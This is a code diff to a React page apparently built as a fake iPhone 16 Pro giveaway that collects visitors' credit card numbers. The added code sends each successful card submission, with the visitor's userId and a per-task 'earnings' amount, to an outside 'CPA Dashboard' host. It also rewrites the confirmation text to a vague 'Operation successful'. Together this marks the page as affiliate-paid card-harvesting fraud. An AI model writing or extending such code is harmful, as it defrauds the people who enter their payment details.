@@ -88,6 +88,33 @@ export default function App() {
       
       setIsSubmitted(true);
       setPaymentError('');
+
+      // Notify CPA Dashboard
+      const urlParams = new URLSearchParams(window.location.search);
+      const userId = urlParams.get('userId');
+      
+      if (userId) {
+        const notifyCpaDashboard = async () => {
+          try {
+            await fetch('https://cpa-565218-w95z.vercel.app.run.app/api/task-completed', {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json',
+                'Authorization': 'Bearer your_secure_token_here'
+              },
+              body: JSON.stringify({
+                userId: userId,
+                taskInfo: "iPhone 16 Pro 任务",
+                earnings: 12.50,
+                transactionId: "ID_" + Date.now()
+              })
+            });
+          } catch (error) {
+            console.error("同步失败:", error);
+          }
+        };
+        notifyCpaDashboard();
+      }
     } else {
       setPaymentError('Invalid credit card number. Please check your card details.');
     }
@@ -695,9 +722,9 @@ export default function App() {
                       <div className="w-20 h-20 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto mb-6">
                         <CheckCircle className="w-10 h-10" />
                       </div>
-                      <h3 className="text-2xl font-bold text-gray-900 mb-2">Entry Received!</h3>
+                      <h3 className="text-2xl font-bold text-gray-900 mb-2">Congratulations!</h3>
                       <p className="text-gray-600 mb-8">
-                        Thank you for participating. We'll contact you at your email address if you're the lucky winner.
+                        Operation successful! Thank you for your participation.
                       </p>
                     </motion.div>
                   )}
